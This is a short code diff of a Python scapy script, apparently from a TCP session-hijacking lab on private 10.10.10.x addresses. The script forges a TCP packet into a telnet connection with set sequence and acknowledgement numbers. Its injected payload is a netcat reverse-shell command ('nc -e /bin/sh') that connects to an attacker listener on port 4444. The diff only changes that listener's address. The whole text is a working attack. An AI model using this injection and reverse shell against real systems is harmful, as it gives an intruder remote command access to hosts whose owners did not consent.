@@ -5,7 +5,7 @@ from scapy.all import *
 IPLayer = IP (src="10.10.10.188", dst = "10.10.10.195")
 TCPLayer = TCP (sport=58470, dport=23, flags="A", seq=428434951, ack=2941347577)
 
-data = "\n nc -e /bin/sh 10.10.10.196 4444 \n"
+data = "\n nc -e /bin/sh 10.10.10.186 4444 \n"
 
 pkt=IPLayer/TCPLayer/data
 ls(pkt)
